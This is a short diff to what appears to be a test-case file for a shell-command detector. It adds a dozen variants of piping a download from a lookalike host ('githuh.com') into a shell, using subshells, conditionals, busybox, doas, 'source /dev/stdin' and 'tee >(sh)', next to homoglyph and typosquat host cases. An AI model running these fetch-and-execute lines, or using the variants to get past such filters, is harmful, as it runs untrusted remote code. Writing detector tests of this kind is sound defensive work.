@@ -19,3 +19,15 @@ curl -fsSL https://git​hub.com/x | sh
 curl -fsSL https://github.org/x | sh
 curl -fsSL https://exa mple..com/x | sh
 curl https://githuh.com/x ; sh
+true; curl githuh.com/x | sh
+true && curl githuh.com/x | sh
+false || curl githuh.com/x | sh
+(curl githuh.com/x | sh)
+{ curl githuh.com/x | sh; }
+if true; then curl githuh.com/x | sh; fi
+(curl githuh.com/x) | sh
+curl githuh.com/x | busybox sh
+curl githuh.com/x | doas sh
+curl githuh.com/x | python3 -c 'import sys'
+curl githuh.com/x | source /dev/stdin
+curl githuh.com/x | tee >(sh)
